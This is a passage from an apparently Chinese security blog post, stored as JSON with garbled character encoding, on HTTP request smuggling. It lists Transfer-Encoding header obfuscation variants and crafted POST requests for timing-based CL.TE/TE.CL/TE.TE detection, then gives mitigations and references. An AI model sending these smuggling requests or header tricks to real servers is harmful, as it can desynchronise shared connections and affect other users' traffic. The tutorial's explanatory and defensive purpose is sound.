xchunked</li>\n<li>Transfer-Encoding : chunked</li>\n<li>Transfer-Encoding: chunked<br>\nTransfer-Encoding: x</li>\n<li>Transfer-Encoding:[tab]chunked</li>\n<li>[space]Transfer-Encoding: chunked</li>\n<li>X: X[\\n]Transfer-Encoding: chunked</li>\n<li>\n<dl>\n<dt>Transfer-Encoding</dt>\n<dd>chunked</dd>\n</dl>\n</li>\n</ul>\n<h1 id=\"æ£€æµ‹httpè¯·æ±‚èµ°ç§\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æµ‹httpè¯·æ±‚èµ°ç§\">#</a> æ£€æµ‹ HTTP è¯·æ±‚èµ°ç§</h1>\n<p>å®æ—¶ç«™ç‚¹ï¼Œæµé‡è¾ƒå¤§ï¼Œå¯èƒ½å°†æˆ‘ä»¬çš„ payload æ‹¼æ¥è‡³åˆ«çš„ç”¨æˆ·æ•°æ®åŒ…ä¸­</p>\n<p>ä»¥ä¸‹åˆ—å‡ºä¸€ç§å‡ ä¹æ²¡æœ‰å½±å“å…¶ä»–ç”¨æˆ·é£é™©çš„æ£€æµ‹æ‰‹æ®µ</p>\n<figure class=\"highlight plaintext\"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /smuggled HTTP/1.1</span><br><span class=\"line\">HOST: example.com</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Length: 4</span><br><span class=\"line\"></span><br><span class=\"line\">1</span><br><span class=\"line\">Z</span><br><span class=\"line\">Q</span><br></pre></td></tr></table></figure>\n<h2 id=\"clet-2\"><a class=\"markdownIt-Anchor\" href=\"#clet-2\">#</a> <a href=\"http://CL.ET\">CL.ET</a></h2>\n<p>å‰ç«¯æ£€æµ‹å®ä½“é•¿åº¦ä¸º 4 ä¸ªå­—èŠ‚ï¼ŒQ ä¸ä¼šè¢«è½¬å‘ï¼Œåç«¯æ²¡æœ‰æ¥å—åˆ°ç»ˆæ­¢å—ï¼Œä¼šä¸€ç›´ç­‰å¾…è‡³è¶…æ—¶ï¼Œæ­¤æ—¶ä¼šæœ‰æ˜æ˜¾çš„å»¶è¿Ÿæ•ˆæœ</p>\n<h2 id=\"clcl\"><a class=\"markdownIt-Anchor\" href=\"#clcl\">#</a> <a href=\"http://CL.CL\">CL.CL</a></h2>\n<p>ä¼šè¢«ä¸¤ä¸ªç³»ç»Ÿæ— å®³å¤„ç†</p>\n<h2 id=\"tecl-2\"><a class=\"markdownIt-Anchor\" href=\"#tecl-2\">#</a> <a href=\"http://TE.CL\">TE.CL</a>&amp;TE.TE</h2>\n<p>ç”±äºæ— æ•ˆçš„å¤§å°å— Qï¼Œå‰ç«¯å°†æ‹’ç»è¯¥æ¶ˆæ¯ï¼Œä¸ä¼šå°†å…¶è½¬å‘è‡³åç«¯</p>\n<p>é‚£ä¹ˆæ€ä¹ˆåŒºåˆ†ä»¥ä¸Šä¸¤ä¸ªå‘¢ï¼Œä¸”çœ‹ä¸‹é¢è¿™ä¸ªæ•°æ®åŒ…</p>\n<figure class=\"highlight plaintext\"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /smuggled HTTP/1.1</span><br><span class=\"line\">HOST: example.com</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Length: 9</span><br><span class=\"line\"></span><br><span class=\"line\">0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">X</span><br></pre></td></tr></table></figure>\n<p>ä¸º TE.CL æ¨¡å¼æ—¶ï¼Œå‰ç«¯æ¥æ”¶ç»ˆæ­¢å—ï¼Œè½¬å‘ Xï¼ˆä¸åŒ…æ‹¬ Xï¼‰ä»¥å‰çš„å†…å®¹è‡³åç«¯æœåŠ¡å™¨ï¼Œå…± 7 ä¸ªå­—èŠ‚ã€‚åç«¯æœåŠ¡å™¨å¤„ç† Content-Length å¤´ï¼Œè®¤ä¸ºå®ä½“ä¸º 9 ä¸ªå­—èŠ‚ï¼ˆ&gt;7ï¼‰ï¼Œæ­¤æ—¶ä¹Ÿä¼šå‡ºç°æ˜æ˜¾å»¶è¿Ÿ</p>\n<p>ä¸º TE.TE æ—¶ï¼Œæ­£ç¡®çš„ç»ˆæ­¢å—æ ¼å¼ï¼Œä¼šè¢«ç³»ç»Ÿæ— å®³å¤„ç†</p>\n<p>â­burp å•†åº—ä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ° HTTP Request Smuggler æ¨¡å—ï¼Œå¯ä»¥ scan å‡ºæ¥åï¼Œå³é”® Smuggle attack</p>\n<p>â­å·¥å…·ï¼š<a href=\"https://github.com/defparam/smuggler\">https://github.com/defparam/smuggler</a></p>\n<h1 id=\"ä¿®å¤httpè¯·æ±‚èµ°ç§\"><a class=\"markdownIt-Anchor\" href=\"#ä¿®å¤httpè¯·æ±‚èµ°ç§\">#</a> ä¿®å¤ HTTP è¯·æ±‚èµ°ç§</h1>\n<h2 id=\"æˆ‘-ä¸-ç†-è§£\"><a class=\"markdownIt-Anchor\" href=\"#æˆ‘-ä¸-ç†-è§£\">#</a> æˆ‘ ä¸ ç† è§£</h2>\n<p>åœ¨å‰ç«¯æœåŠ¡å™¨é€šè¿‡åŒä¸€ç½‘ç»œè¿æ¥å°†å¤šä¸ªè¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œä¼šå‡ºç° HTTP è¯·æ±‚èµ°ç§æ¼æ´ï¼Œå¹¶ä¸”åç«¯è¿æ¥æ‰€ä½¿ç”¨çš„åè®®æœ‰å¯èƒ½ä¼šé€ æˆè¾¹ç•Œä¸ç»Ÿä¸€çš„é£é™©ã€‚é˜²æ­¢ HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„ä¸€äº›é€šç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p>\n<p>1. ç¦ç”¨åç«¯è¿æ¥çš„é‡ç”¨ï¼Œä»¥ä¾¿æ¯ä¸ªåç«¯è¯·æ±‚é€šè¿‡å•ç‹¬çš„ç½‘ç»œè¿æ¥å‘é€ã€‚</p>\n<p>2. ä½¿ç”¨ HTTP / 2 è¿›è¡Œåç«¯è¿æ¥ï¼Œå› ä¸ºæ­¤åè®®å¯é˜²æ­¢å¯¹è¯·æ±‚ä¹‹é—´çš„è¾¹ç•Œäº§ç”Ÿæ­§ä¹‰ã€‚</p>\n<p>3. å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä½¿ç”¨å®Œå…¨ç›¸åŒçš„ Web æœåŠ¡å™¨è½¯ä»¶ï¼Œä»¥ä¾¿å®ƒä»¬å°±è¯·æ±‚ä¹‹é—´çš„ç•Œé™è¾¾æˆä¸€è‡´ã€‚</p>\n<h1 id=\"ä¼ é€é—¨\"><a class=\"markdownIt-Anchor\" href=\"#ä¼ é€é—¨\">#</a> ä¼ é€é—¨</h1>\n<p><a href=\"https://portswigger.net/web-security/request-smuggling\">PortSwigger_HTTP request smuggling</a></p>\n<p><a href=\"https://www.freebuf.com/column/221488.html\">HTTP èµ°ç§æ¼æ´åˆ†æ</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&amp;mid=2247486547&amp;idx=1&amp;sn=de1f1390b6526eb2e45a0e05c4fd444d&amp;chksm=9b392ae2ac4ea3f4fbc01e19a9494a2d8fec4b20fae5e93041cfc6f874f7eebff14d5420c499&amp;mpshare=1&amp;scene=23&amp;srcid=0824Nx28uGiuA86YDMRjhkR0&amp;sharer_sharetime=1598277825562&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd\">ç”±ä¸€æ¬¡æ¸—é€æµ‹è¯•å¼•å‘çš„ HTTP è¯·æ±‚èµ°ç§æ€è€ƒ (ç‰›çš„)</a></p>\n",
            "tags": [
                "web,HTTP"
            ]
        }
    ]
}